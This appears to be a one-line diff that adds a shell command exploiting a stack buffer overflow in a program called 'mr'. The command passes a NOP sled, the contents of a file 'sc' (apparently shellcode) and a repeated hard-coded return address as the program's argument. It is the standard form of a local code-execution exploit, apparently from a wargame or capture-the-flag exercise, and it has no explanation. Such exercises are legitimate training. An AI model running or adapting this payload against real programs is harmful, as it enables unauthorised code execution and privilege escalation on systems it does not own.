@@ -1,0 +1,1 @@
+mr `perl -e 'print "\x90"x203';``cat sc``perl -e 'print "\xf8\xed\xff\xbf"x38';`
